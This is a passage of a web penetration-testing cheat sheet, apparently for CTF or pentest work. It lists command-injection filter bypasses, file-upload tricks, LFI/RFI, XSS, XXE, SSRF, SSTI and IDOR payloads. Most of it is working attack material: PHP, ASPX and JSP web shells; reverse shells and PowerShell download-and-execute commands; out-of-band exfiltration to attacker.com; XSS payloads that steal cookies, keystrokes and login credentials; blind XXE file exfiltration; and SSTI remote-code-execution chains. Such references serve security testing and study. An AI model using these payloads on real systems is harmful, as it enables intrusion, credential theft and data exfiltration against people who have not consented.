# Time calculation to verify
; date; sleep 5; date

# Timeout command (Windows)
& timeout /t 5
| timeout /t 5
```

**üîç Out-of-Band Detection (OOB):**

```bash
# DNS exfiltration (use Burp Collaborator or interactsh)
; nslookup $(whoami).attacker.com
; dig $(whoami).attacker.com
| host $(whoami).attacker.com

# HTTP callback
; curl https://attacker.com/$(whoami)
; wget https://attacker.com/callback?data=$(id | base64)
| curl https://attacker.com/?data=$(hostname)

# SMB callback (Windows)
& certutil.exe -urlcache -split -f https://attacker.com/test
& net use \\attacker.com\share
```

**üõ°Ô∏è Bypass Techniques:**

```bash
# Space bypass
${IFS}
$IFS$9
{cat,/etc/passwd}
cat</etc/passwd
cat$IFS/etc/passwd
cat${IFS}/etc/passwd

# Command alternatives
# cat -> tac, nl, more, less, head, tail
tac /etc/passwd
nl /etc/passwd
more /etc/passwd

# Keyword filtering bypass
c''at /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd
/bin/c?t /etc/passwd
/???/??t /etc/passwd
\c\a\t /etc/passwd

# Quote bypass
'w'h'o'a'm'i'
"w"h"o"a"m"i"
w''ho''am''i

# Wildcard bypass
/???/n? -? 127.0.0.1  # /bin/nc
/???/?s /  # /bin/ls
/???/?? /???/??ss??  # /bin/cat /etc/passwd

# Hex encoding
$(echo 636174202f6574632f706173737764 | xxd -r -p)  # cat /etc/passwd

# Base64 encoding
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash  # cat /etc/passwd

# Variable expansion
a=c;b=at;$a$b /etc/passwd
```

**ü™ü Windows-Specific Payloads:**

```cmd
# Basic commands
& whoami
| whoami
& hostname
& ipconfig
& net user
& net localgroup administrators

# List files
& dir
& dir C:\
& type C:\Windows\System32\drivers\etc\hosts

# PowerShell download and execute
& powershell -c "IEX(New-Object Net.WebClient).downloadString('https://10.10.14.5/shell.ps1')"
& powershell -exec bypass -c "IEX(New-Object Net.WebClient).downloadString('https://10.10.14.5/shell.ps1')"

# Certutil download
& certutil -urlcache -f https://10.10.14.5/nc.exe nc.exe
& nc.exe 10.10.14.5 4444 -e cmd.exe
```

### 3.4 File Upload Vulnerabilities

> üìñ¬†**Reference**:¬†[Upload Insecure Files - PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/Upload%20Insecure%20Files/)

**üéØ Test Sequence:**

1. Upload harmless file (`.txt`,¬†`.jpg`) - establish baseline
2. Test content-type bypass
3. Test extension bypass
4. Test magic number bypass
5. Test polyglot files
6. Test file content validation

**üîß Extension Bypass Techniques:**

```bash
# Double extension
shell.php.jpg
shell.php.png
shell.jpg.php
shell.png.php
shell.asp.jpg
shell.aspx.png

# Null byte (older systems, PHP < 5.3)
shell.php%00.jpg
shell.php\x00.jpg
shell.php%00.png
shell.asp%00.jpg

# Case manipulation
shell.PhP
shell.pHp
shell.PHP
shell.Php5
shell.AsP
shell.AsPx

# Trailing characters
shell.php.....
shell.php%20
shell.php%0a
shell.php%00
shell.php%0d%0a
shell.php/
shell.php.\

# Windows NTFS Alternate Data Stream
shell.php::$DATA
shell.asp::$DATA

# Alternative PHP extensions
shell.php3
shell.php4
shell.php5
shell.php7
shell.pht
shell.phtm
shell.phtml
shell.phps
shell.phar
shell.pgif
shell.shtml
shell.inc

# ASP/ASPX alternatives
shell.asp
shell.aspx
shell.cer
shell.asa
shell.asax
shell.ascx
shell.ashx
shell.asmx
shell.axd
shell.config
shell.compiled

# JSP alternatives
shell.jsp
shell.jspx
shell.jsw
shell.jsv
shell.jspf
shell.wss

# Other executable extensions
shell.pl
shell.py
shell.rb
shell.cgi
```

**üé® Content-Type Bypass:**

```bash
# Capture upload request in Burp Suite and modify Content-Type:

# Original (blocked)
Content-Type: application/x-php

# Bypass attempts
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
Content-Type: text/plain
Content-Type: application/octet-stream
```

**üìù Magic Number/Signature Bypass (Polyglot Files):**

```bash
# Add magic bytes to beginning of PHP file

# GIF header + PHP
GIF89a;
<?php system($_GET['cmd']); ?>

# GIF header (hexadecimal)
GIF89a<?php system($_GET['cmd']); ?>

# PNG header + PHP
\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x03H\x00\x00\x01\xF4\x08\x06
<?php system($_GET['cmd']); ?>

# JPEG header + PHP
\xff\xd8\xff\xe0
<?php system($_GET['cmd']); ?>

# PDF header + PHP
%PDF-1.5
<?php system($_GET['cmd']); ?>
```

**üß© Creating Polyglot Files:**

```bash
# Method 1: Using exiftool (inject PHP into image metadata)
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg shell.php.jpg

# Method 2: Manual GIF polyglot
echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif

# Method 3: Prepend magic bytes to PHP shell
printf '\xff\xd8\xff\xe0' > shell.php
cat phpshell.php >> shell.php

# View metadata
exiftool shell.php.jpg
file shell.php.jpg
```

**üîç File Size Bypass:**

```bash
# Some filters check file size
# Try minimum valid file (1 byte)
# Try exact maximum allowed size
# Try just under maximum (max - 1 byte)
```

**üåê Common Upload Locations to Test:**

```
/uploads/
/upload/
/files/
/file/
/images/
/image/
/media/
/assets/
/static/
/content/
/tmp/
/temp/
/user_uploads/
/profile_images/
/attachments/
/documents/
/downloads/
```

**üß™ PHP Shell Examples:**

```php
# Simple PHP shell
<?php system($_GET['cmd']); ?>
```

```php
# One-liner shell
<?php echo shell_exec($_GET['cmd']); ?>
```

```php
# Ultra-minimal shell
<?=`$_GET[0]`?>
```

```php
# Short tags
<? system($_GET['cmd']); ?>
```

```php
# Alternative functions #1
<?php passthru($_GET['cmd']); ?>
```

```php
# Alternative functions #2
<?php exec($_GET['cmd']); ?>
```

```php
# Alternative functions #3
<?php shell_exec($_GET['cmd']); ?>
```

```php
# Alternative functions #4
<?=$_GET[0]($_GET[1]);?>
```

```php
# More robust shell with output
<?php
if(isset($_GET['cmd'])){
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
```

```php
# Obfuscated shell
<?php $a=$_GET['a'];$b=$_GET['b'];$a($b); ?>
# Usage: shell.php?a=system&b=whoami
```

```php
# Using assert (older PHP)
<?php assert($_GET['cmd']); ?>
```

```php
# Using preg_replace (PHP < 5.5)
<?php preg_replace('/.*/e', $_GET['cmd'], ''); ?>
```

```php
# File upload + execution
<?php
if($_FILES){
    move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']);
}
?>
```

**ü™ü ASP/ASPX Shell Examples:**

```asp
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object sender, EventArgs e){
    Response.Write("<pre>");
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + Request.QueryString["cmd"];
    p.StartInfo.RedirectStandardOutput = true;
    p.StartInfo.UseShellExecute = false;
    p.Start();
    Response.Write(p.StandardOutput.ReadToEnd());
    Response.Write("</pre>");
}
</script>
```

**‚òï JSP Shell Example:**

```jsp
<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    Process p = Runtime.getRuntime().exec(cmd);
    InputStream in = p.getInputStream();
    int a;
    while((a = in.read()) != -1) {
        out.print((char)a);
    }
%>
```

### 3.5 Path Traversal and LFI/RFI

> üìñ¬†**References**:
> 
> - [File Inclusion - PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/File%20Inclusion/)
> - [Directory Traversal - PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/Directory%20Traversal/)

**üîç Basic Traversal Tests:**

```text
# Standard traversal (Linux)
../../../../etc/passwd
../../../../../../../../etc/passwd
../../../../../../../../../../../etc/passwd

# Windows traversal
..\..\..\..\windows\system32\drivers\etc\hosts
..\..\..\..\windows\win.ini
..\..\..\..\boot.ini

# URL encoded (single encoding)
..%2F..%2F..%2F..%2Fetc%2Fpasswd
..%2F..%2F..%2F..%2Fwindows%2Fwin.ini

# URL encoded (double encoding)
..%252F..%252F..%252Fetc%252Fpasswd

# Different encoding types
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
..%e0%80%af..%e0%80%afetc%e0%80%afpasswd

# Path bypass with dots
....//....//....//etc/passwd
....\/....\/....\/etc/passwd
..///////..////..//////etc/passwd

# Unicode/UTF-8 encoding
..%c1%1c..%c1%1c..%c1%1cetc%c1%1cpasswd
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd

# Null byte (older PHP < 5.3)
../../../../etc/passwd%00
../../../../etc/passwd%00.jpg
../../../../etc/passwd\x00

# Absolute paths
/etc/passwd
/etc/shadow
/var/www/html/index.php
C:\Windows\System32\drivers\etc\hosts
C:\boot.ini
C:\inetpub\wwwroot\web.config

# Mixed slashes
..\/..\/..\/etc/passwd
....\/\/....\/\/etc/passwd
```

**üß© PHP Wrappers (LFI to RCE):**

```text
# php://filter - Base64 encode source code
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=../config.php
php://filter/convert.base64-encode/resource=/var/www/html/admin.php

# Read and decode:
echo "BASE64_OUTPUT" | base64 -d

# Different encodings
php://filter/read=string.rot13/resource=index.php
php://filter/convert.iconv.utf-8.utf-7/resource=index.php
php://filter/convert.iconv.utf-8.utf-16/resource=index.php

# php://input - Execute PHP code via POST data
php://input
# POST data: <?php system('id'); ?>
# POST data: <?php system($_GET['cmd']); ?>

# Usage with curl
curl -X POST "https://<IP>/index.php?page=php://input" -d "<?php system('id'); ?>"
curl -X POST "https://<IP>/index.php?page=php://input" -d "<?php system(\$_GET['cmd']); ?>" -G --data-urlencode "cmd=whoami"

# data:// wrapper - Execute PHP code inline
data://text/plain,<?php system('id'); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==

# Base64 encode payload
echo -n '<?php system($_GET["cmd"]); ?>' | base64
# Result: PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+

# Usage
https://<IP>/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+&cmd=id

# expect:// wrapper (if expect extension installed - rare)
expect://id
expect://ls
expect://whoami

# Usage
https://<IP>/index.php?page=expect://id

# zip:// wrapper
zip://archive.zip#shell.php
zip:///path/to/archive.zip#shell.php

# phar:// wrapper
phar://shell.phar/shell.php
phar:///path/to/shell.phar/shell.php

# Create phar archive
# 1. Create shell.php
# 2. Create phar: php -r '$phar = new Phar("shell.phar"); $phar->addFile("shell.php"); $phar->stopBuffering();'
# 3. Upload shell.phar
# 4. Access: ?page=phar://shell.phar/shell.php
```

**üîó PHP Filter Chain Generator (LFI to RCE without File Upload):**

> üìñ¬†**Tool**:¬†[PHP Filter Chain Generator](https://github.com/synacktiv/php_filter_chain_generator)

```bash
# Install
git clone https://github.com/synacktiv/php_filter_chain_generator
cd php_filter_chain_generator
```

```bash
# Generate filter chain for command execution
python3 php_filter_chain_generator.py --chain '<?php system($_GET[0]); ?>'

# Output will be a long php://filter chain
```

```bash
# Use generated chain
curl "https://<IP>/index.php?page=php://filter/convert.iconv...<GENERATED_CHAIN>...php://temp&0=id"
```

```bash
# Generate reverse shell chain
python3 php_filter_chain_generator.py --chain "<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/10.10.14.5/4444 0>&1\"'); ?>"
```

```bash
# Save to file for easy use
python3 php_filter_chain_generator.py --chain '<?php system($_GET[0]); ?>' | grep "^php" > payload.txt
```

```bash
# Execute with curl
curl "https://<IP>/index.php?file=$(cat payload.txt)&0=whoami"
```

**üîç Common Files to Target (Linux):**

```
# Password files
/etc/passwd
/etc/shadow
/etc/group
/etc/security/passwd
/etc/security/group

# System info
/etc/hosts
/etc/hostname
/etc/issue
/etc/os-release
/etc/lsb-release
/proc/version
/proc/cmdline
/proc/self/environ
/proc/self/stat
/proc/self/status

# Web server configs
/etc/apache2/apache2.conf
/etc/apache2/sites-available/000-default.conf
/etc/apache2/sites-enabled/000-default.conf
/etc/nginx/nginx.conf
/etc/nginx/sites-available/default
/etc/nginx/sites-enabled/default
/etc/httpd/conf/httpd.conf
/usr/local/apache2/conf/httpd.conf
/usr/local/etc/apache22/httpd.conf

# Database configs
/etc/mysql/my.cnf
/etc/mysql/mysql.conf.d/mysqld.cnf
/var/lib/mysql/my.cnf
/etc/postgresql/*/main/pg_hba.conf

# SSH configs and keys
/etc/ssh/sshd_config
/etc/ssh/ssh_config
/root/.ssh/id_rsa
/root/.ssh/id_dsa
/root/.ssh/authorized_keys
/home/user/.ssh/id_rsa
/home/user/.ssh/id_dsa
/home/user/.ssh/authorized_keys
/home/user/.ssh/known_hosts

# Shell history
/root/.bash_history
/root/.zsh_history
/home/user/.bash_history
/home/user/.zsh_history

# Logs (for log poisoning)
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/auth.log
/var/log/syslog
/var/log/messages
/var/log/secure
/var/log/mail.log
/var/log/vsftpd.log
/var/log/httpd/access_log
/var/log/httpd/error_log

# Mail
/var/mail/root
/var/mail/www-data
/var/spool/mail/root
/var/spool/mail/www-data

# Cron
/etc/crontab
/etc/cron.d/*
/var/spool/cron/crontabs/root

# Application files
/var/www/html/index.php
/var/www/html/config.php
/var/www/html/wp-config.php
/var/www/html/.env
```

**üîç Common Files to Target (Windows):**

```
# System files
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\SECURITY
C:\Windows\win.ini
C:\Windows\system.ini
C:\boot.ini

# IIS configs
C:\inetpub\wwwroot\web.config
C:\Windows\System32\inetsrv\config\applicationHost.config
C:\inetpub\logs\LogFiles\W3SVC1\

# Apache/XAMPP (Windows)
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\mysql\bin\my.ini
C:\xampp\phpMyAdmin\config.inc.php

# Installation/Setup logs
C:\Windows\debug\NetSetup.log
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend\Unattended.xml

# User files
C:\Users\Administrator\Desktop\
C:\Users\Administrator\Documents\
C:\Users\Administrator\AppData\Roaming\
C:\Users\Public\Desktop\
```

**üéØ Web Application Specific Files:**

```
# PHP configs
/var/www/html/index.php
/var/www/html/config.php
/var/www/html/configuration.php
/var/www/html/settings.php
/var/www/html/db_config.php
/var/www/html/database.php

# WordPress
../../../../wp-config.php
/var/www/html/wp-config.php
/var/www/html/wp-content/plugins/
/var/www/html/wp-includes/version.php
/var/www/html/wp-admin/

# Drupal
/var/www/html/sites/default/settings.php

# Joomla
/var/www/html/configuration.php

# Session files (for Session hijacking)
/var/lib/php/sessions/sess_[PHPSESSID]
/var/lib/php5/sessions/sess_[PHPSESSID]
/tmp/sess_[PHPSESSID]
```

**üíâ Log Poisoning (LFI to RCE):**

```bash
# Apache access.log poisoning via User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" https://<IP>/
curl -A "<?php system(\$_GET['c']); ?>" https://<IP>/test.php

# Then include the log file
curl "https://<IP>/index.php?page=/var/log/apache2/access.log&cmd=id"
curl "https://<IP>/index.php?page=../../../var/log/apache2/access.log&c=whoami"

# Nginx log poisoning
curl -A "<?php system(\$_GET['cmd']); ?>" https://<IP>/
curl "https://<IP>/index.php?page=/var/log/nginx/access.log&cmd=id"

# Poison via Referer header
curl -H "Referer: <?php system(\$_GET['cmd']); ?>" https://<IP>/

# SSH log poisoning (auth.log)
ssh '<?php system($_GET["cmd"]); ?>'@<IP>
# Then include /var/log/auth.log

# Mail log poisoning
telnet <IP> 25
MAIL FROM: <?php system($_GET['cmd']); ?>
RCPT TO: root
DATA
test
.
QUIT

# Then include /var/mail/www-data or /var/log/mail.log
curl "https://<IP>/index.php?page=/var/log/mail.log&cmd=id"

# FTP log poisoning
ftp <IP>
USER <?php system($_GET['cmd']); ?>
# Then include /var/log/vsftpd.log
```

**üîó Remote File Inclusion (RFI):**

```text
# Basic RFI (when allow_url_include=On in php.ini)
https://<IP>/index.php?page=https://attacker.com/shell.txt
https://<IP>/index.php?page=https://10.10.14.5/shell.php

# With null byte (older PHP)
https://<IP>/index.php?page=https://attacker.com/shell.txt%00

# SMB share (Windows targets)
https://<IP>/index.php?page=\\attacker.com\share\shell.php
https://<IP>/index.php?page=\\10.10.14.5\share\shell.php

# FTP protocol
https://<IP>/index.php?page=ftp://attacker.com/shell.txt
https://<IP>/index.php?page=ftp://10.10.14.5/shell.txt

# Setting up simple HTTP server for RFI
python3 -m http.server 80
php -S 0.0.0.0:80

# Shell content (shell.txt)
<?php system($_GET['cmd']); ?>
```

### 3.6 XSS (Cross-Site Scripting)

> üìñ¬†**Reference**:¬†[XSS Injection - PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/XSS%20Injection/)

**üß™ Basic Detection Payloads:**

```html
# Standard alert boxes
<script>alert(1)</script>
<script>alert('XSS')</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>

# Image tag with onerror
<img src=x onerror=alert(1)>
<img src=x onerror=alert(document.cookie)>
<img src=x onerror=alert(document.domain)>

# SVG tags
<svg onload=alert(1)>
<svg/onload=alert(1)>
<svg><script>alert(1)</script></svg>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>

# Body tag
<body onload=alert(1)>
<body onpageshow=alert(1)>

# Input tags
<input autofocus onfocus=alert(1)>
<input onfocus=alert(1) autofocus>

# Details tag
<details open ontoggle=alert(1)>
<details ontoggle=alert(1) open>

# Iframe
<iframe src="javascript:alert(1)">
<iframe onload=alert(1)>

# Plain text injection (in href, etc.)
javascript:alert(1)
javascript:alert(document.cookie)

# Markdown injection (if markdown is rendered)
[Click me](javascript:alert(1))
```

**üõ°Ô∏è Filter Bypass Techniques:**

```html
# Case manipulation
<ScRiPt>alert(1)</ScRiPt>
<sCrIpT>alert(1)</sCrIpT>

# Without script tags
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>

# Without parentheses
<script>onerror=alert;throw 1</script>
<script>throw onerror=alert,1</script>
<script>import('data:text/javascript,alert(1)')</script>

# Without quotes
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror=alert(1)>

# Without spaces
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>

# Encoding techniques
<script>alert(/XSS/.source)</script>
<script>alert\u0028document.domain\u0029</script>
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">

# Alternative event handlers
<svg/onload=alert(1)//
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<video><source onerror="alert(1)">
<audio src=x onerror=alert(1)>
<marquee onstart=alert(1)>
<details open ontoggle="alert(1)">

# Using different JavaScript contexts
<a href="javascript:alert(1)">Click</a>
<form action="javascript:alert(1)"><input type=submit>
<isindex type=submit value=XSS>

# Breaking out of attributes
"><script>alert(1)</script>
'><script>alert(1)</script>
" onmouseover="alert(1)
' onmouseover='alert(1)

# Breaking out of script tags
</script><script>alert(1)</script>
</ScRiPt><ScRiPt>alert(1)</ScRiPt>

# Comment tricks
<!--><script>alert(1)</script>
<script><!--
alert(1)
--></script>

# Using backticks
<script>alert`1`</script>
<script>alert`document.domain`</script>
```

**üç™ Cookie Stealing Payloads:**

```html
# Basic cookie exfiltration with document.location
<script>document.location='https://attacker.com/?c='+document.cookie</script>
<script>window.location='https://10.10.14.5/?c='+document.cookie</script>

# Using Image object
<script>new Image().src='https://attacker.com/?c='+document.cookie</script>
<script>var i=new Image();i.src='https://10.10.14.5/?c='+btoa(document.cookie)</script>

# Using fetch API
<script>fetch('https://attacker.com/?c='+document.cookie)</script>
<script>fetch('https://10.10.14.5/?c='+btoa(document.cookie))</script>

# Hidden image tag
<img src=x onerror="this.src='https://attacker.com/?c='+document.cookie">
<img src=x onerror="this.src='https://10.10.14.5/?c='+btoa(document.cookie)">

# Using XMLHttpRequest
<script>
var xhr=new XMLHttpRequest();
xhr.open('GET','https://attacker.com/?c='+document.cookie);
xhr.send();
</script>

# Exfiltrate to Burp Collaborator
<script>document.location='https://BURP_COLLABORATOR.com/?c='+document.cookie</script>

# Set up listener to capture cookies
nc -lvnp 80
python3 -m http.server 80

# Session hijacking payload
<script>
var cookies = document.cookie;
window.location = 'https://10.10.14.5/?cookie=' + encodeURIComponent(cookies);
</script>

# Exfiltrate localStorage and sessionStorage
<script>
var data = {
  cookies: document.cookie,
  localStorage: JSON.stringify(localStorage),
  sessionStorage: JSON.stringify(sessionStorage)
};
fetch('https://10.10.14.5/', {
  method: 'POST',
  body: JSON.stringify(data)
});
</script>
```

**üéØ High-Risk Areas for XSS Testing:**

- Search functionality
- Contact/comment forms
- User profile fields (username, bio, about)
- URL parameters reflected in responses
- Error messages
- File upload filenames
- Referer headers reflected
- User-Agent reflected
- Any user input displayed back

**üîç DOM-Based XSS:**

```html
# Test with location.hash (fragment identifier)
https://<IP>/page.html#<script>alert(1)</script>
https://<IP>/page.html#<img src=x onerror=alert(1)>

# Test with location.search (query string)
https://<IP>/page.html?query=<script>alert(1)</script>

# Example vulnerable code (innerHTML sink)
<script>
document.getElementById('content').innerHTML = location.hash.slice(1);
</script>
# Payload: #<img src=x onerror=alert(1)>

# Example vulnerable code (eval sink)
<script>
eval(location.hash.slice(1));
</script>
# Payload: #alert(1)

# document.write sink
<script>
document.write(location.hash.slice(1));
</script>
# Payload: #<img src=x onerror=alert(1)>
```

**üíâ Advanced XSS Payloads:**

```html
# Keylogger
<script>
document.onkeypress = function(e) {
  fetch('https://10.10.14.5/?key=' + String.fromCharCode(e.which));
}
</script>

# Page defacement
<script>document.body.innerHTML='<h1>Hacked!</h1>'</script>

# Redirect to phishing page
<script>window.location='https://evil.com/phishing.html'</script>

# BeEF hook
<script src="https://10.10.14.5:3000/hook.js"></script>

# Steal forms data
<script>
document.forms[0].onsubmit = function() {
  fetch('https://10.10.14.5/?data=' + 
    encodeURIComponent(JSON.stringify({
      username: this.username.value,
      password: this.password.value
    })));
}
</script>
```

### 3.7 Advanced Vulnerability Classes

|Vulnerability|Trigger Condition|Initial Test|Resources|
|---|---|---|---|
|**XXE (XML External Entity)**|XML processing endpoints|`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`|[XXE Injection](https://swisskyrepo.github.io/PayloadsAllTheThings/XXE%20Injection/)|
|**SSRF**|URL fetching functionality|`https://127.0.0.1:80`|[SSRF](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Request%20Forgery/)|
|**Deserialization**|Serialized objects in cookies/data|Language-specific payloads|[Deserialization](https://swisskyrepo.github.io/PayloadsAllTheThings/Insecure%20Deserialization/)|
|**SSTI**|Template engines (Jinja2, Twig, etc.)|`{{7*7}}`¬†or¬†`${7*7}`|[SSTI](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/)|
|**IDOR**|Direct object references in URLs|Change ID parameters sequentially|[IDOR](https://swisskyrepo.github.io/PayloadsAllTheThings/Insecure%20Direct%20Object%20References/)|
|**CSRF**|State-changing actions without tokens|Remove/modify CSRF tokens|[CSRF](https://swisskyrepo.github.io/PayloadsAllTheThings/CSRF%20Injection/)|
|**API Abuse**|REST/GraphQL APIs|Test auth, rate limits, IDOR|[API Testing](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/web-api-pentesting)|

#### XXE (XML External Entity) Injection

```xml
# Basic XXE - File Read (Linux)
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>

# Basic XXE - File Read (Windows)
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<data>&xxe;</data>

# XXE with parameter entity
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>

# Blind XXE - Out-of-Band exfiltration
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://attacker.com/xxe.dtd"> %xxe;]>
<data>&send;</data>

# xxe.dtd content (host this on attacker server):
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'https://attacker.com/?data=%file;'>">
%eval;

# XXE to SSRF (port scanning)
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "https://127.0.0.1:22/">]>
<data>&xxe;</data>

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "https://127.0.0.1:3306/">]>
<data>&xxe;</data>

# XXE in SOAP request
<soap:Envelope xmlns:soap="https://schemas.xmlsoap.org/soap/envelope/">
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Body><foo>&xxe;</foo></soap:Body>
</soap:Envelope>

# XXE via SVG upload
<svg xmlns="https://www.w3.org/2000/svg" xmlns:xlink="https://www.w3.org/1999/xlink">
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<text>&xxe;</text>
</svg>

# XXE in SVG with OOB
<!DOCTYPE svg [
<!ENTITY % remote SYSTEM "https://attacker.com/evil.dtd">
%remote;
]>

# Testing various formats
# Try: XML, SOAP, SVG, DOCX (unzip and modify), XLSX, PPTX
```

#### SSRF (Server-Side Request Forgery)

```bash
# Basic SSRF tests - Localhost
https://127.0.0.1
https://localhost
https://[::1]
https://0.0.0.0
https://0
https://127.1
https://2130706433  # Decimal notation
https://0x7f000001  # Hexadecimal
https://0177.0.0.1  # Octal

# Port scanning internal network
https://127.0.0.1:22
https://127.0.0.1:80
https://127.0.0.1:3306
https://127.0.0.1:6379
https://127.0.0.1:8080
https://192.168.1.1:80
https://10.0.0.1:80

# Cloud metadata endpoints (AWS)
https://169.254.169.254/latest/meta-data/
https://169.254.169.254/latest/user-data/
https://169.254.169.254/latest/meta-data/iam/security-credentials/
https://169.254.169.254/latest/meta-data/hostname
https://169.254.169.254/latest/meta-data/public-keys/

# Cloud metadata (Google Cloud)
https://metadata.google.internal/computeMetadata/v1/
https://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Cloud metadata (Azure)
https://169.254.169.254/metadata/instance?api-version=2021-02-01

# Bypass filters - DNS tricks
https://127.0.0.1.nip.io
https://127.0.0.1.xip.io
https://localtest.me
https://customer1.app.localhost.my.company.127.0.0.1.nip.io
https://spoofed.burpcollaborator.net

# Bypass using different protocols
file:///etc/passwd
dict://127.0.0.1:6379/info
gopher://127.0.0.1:6379/_INFO
sftp://127.0.0.1:22

# Bypass with redirects (open redirect)
https://trusted-site.com/redirect?url=https://169.254.169.254/

# Accessing internal services
https://localhost:3000/admin
https://127.0.0.1:8080/manager/html
https://127.0.0.1:6379  # Redis
https://127.0.0.1:3306  # MySQL
https://127.0.0.1:5432  # PostgreSQL

# URL encoding bypass
https://127.0.0.1 ‚Üí https://%31%32%37%2e%30%2e%30%2e%31
```

#### SSTI (Server-Side Template Injection)

```python
# Detection payloads (test all of these)
{{7*7}}          # Jinja2, Twig (result: 49)
${7*7}           # FreeMarker, Velocity (result: 49)
<%= 7*7 %>       # ERB (result: 49)
${{7*7}}         # Test combination
#{7*7}           # Thymeleaf (result: 49)
*{7*7}           # Test alternative
@(7*7)           # Razor
{7*7}            # Test simple

# Jinja2 (Python/Flask)
{{config}}
{{config.items()}}
{{''.__class__.__mro__}}
{{''.__class__.__mro__[1].__subclasses__()}}

# RCE in Jinja2
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()}}

# Read files in Jinja2
{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.getRuntime('Symfony\\Component\\Routing\\RequestContext').getBaseUrl()}}

# FreeMarker (Java)
${"freemarker.template.utility.Execute"?new()("id")}
<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}

# Velocity (Java)
#set($x='')
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('id'))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end

# ERB (Ruby)
<%= system("id") %>
<%= `id` %>
<%= File.open('/etc/passwd').read %>
<%= Dir.entries('/') %>

# Thymeleaf (Java)
${T(java.lang.Runtime).getRuntime().exec('id')}
__${T(java.lang.Runtime).getRuntime().exec("id")}__::

# Smarty (PHP)
{system('id')}
{php}system('id');{/php}

# Tornado (Python)
{{os.popen('id').read()}}
```

#### IDOR (Insecure Direct Object References)

```bash
# Parameter manipulation in URLs
/user/profile?id=1  ‚Üí /user/profile?id=2
/api/document/123  ‚Üí /api/document/124
/api/user/1/data   ‚Üí /api/user/2/data
/download?file=invoice_user1.pdf  ‚Üí /download?file=invoice_user2.pdf

# Cookie manipulation
user_id=1  ‚Üí user_id=2
account=123  ‚Üí account=124

# JSON body manipulation
{"user_id": 1}  ‚Üí {"user_id": 2}

# Base64/encoded IDs
dXNlcjE=  (user1 in base64) ‚Üí dXNlcjI=  (user2)
echo "user1" | base64
echo "user2" | base64

